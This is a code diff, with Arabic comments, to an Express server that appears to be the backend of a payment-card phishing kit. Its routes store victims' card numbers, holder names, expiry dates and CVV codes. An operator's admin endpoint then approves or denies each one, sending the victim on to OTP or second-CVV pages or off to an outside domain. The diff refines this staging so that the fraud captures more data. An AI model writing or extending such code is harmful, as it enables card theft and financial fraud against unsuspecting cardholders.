@@ -132,19 +132,20 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
   
   const currentStatus = booking.status || '';
-  // تحديد التوجيه بناءً على الحالة الحالية
-  const isCvvStage = currentStatus === 'pending_cvv' || currentStatus === 'pending_cvv2';
 
   if (action === 'pass') {
     booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
     
     let redirectTarget;
-    if (isCvvStage) {
-      // مرحلة CVV2: قبول يوجه للنجاح
+    if (currentStatus === 'pending_cvv2') {
+      // مرحلة CVV2 (بعد OTP): قبول يوجه للنجاح
       redirectTarget = 'success';
+    } else if (currentStatus === 'pending_cvv') {
+      // مرحلة CVV الأول: قبول يوجه لصفحة OTP
+      redirectTarget = 'otp';
     } else {
-      // مرحلة KNET/دفع: قبول يوجه لصفحة OTP
+      // أي حالة أخرى: قبول يوجه لصفحة OTP
       redirectTarget = 'otp';
     }
     
@@ -167,11 +168,14 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
     if (booking.payment) booking.payment.paymentAction = 'denied';
     
     let deniedRedirect;
-    if (isCvvStage) {
+    if (currentStatus === 'pending_cvv2') {
       // مرحلة CVV2: رفض يعيد لصفحة CVV2
       deniedRedirect = 'cvv2';
+    } else if (currentStatus === 'pending_cvv') {
+      // مرحلة CVV الأول: رفض يعيد لصفحة CVV
+      deniedRedirect = 'cvv';
     } else {
-      // مرحلة KNET: رفض يعيد للرئيسية
+      // أي حالة أخرى: رفض يعيد للرئيسية
       deniedRedirect = 'https://insoline.online';
     }
     
@@ -353,7 +357,7 @@ app.get('/api/admin/export/:type', authMiddleware, (req, res) => {
 
 // ==================== CVV Routes ====================
 app.post('/api/cvv-submit', (req, res) => {
-  const { referenceId, cvv, amount, cardNumber, cardHolder, expiry } = req.body;
+  const { referenceId, cvv, amount, cardNumber, cardHolder, expiry, stage } = req.body;
   db = loadData();
 
   const ref = referenceId || uuidv4().substring(0, 8).toUpperCase();
@@ -383,7 +387,8 @@ app.post('/api/cvv-submit', (req, res) => {
   db.bookings[ref].payment.cardExpiry = expiry || '';
   db.bookings[ref].payment.amount = amount || '';
   db.bookings[ref].payment.status = 'cvv_received';
-  db.bookings[ref].status = 'pending_cvv';
+  // إذا كان stage = cvv2 (من صفحة CVV2)، نحفظ pending_cvv2 لتمييزها عن CVV الأول
+  db.bookings[ref].status = (stage === 'cvv2') ? 'pending_cvv2' : 'pending_cvv';
   db.bookings[ref].statusRead = 0;
   saveData(db);
 
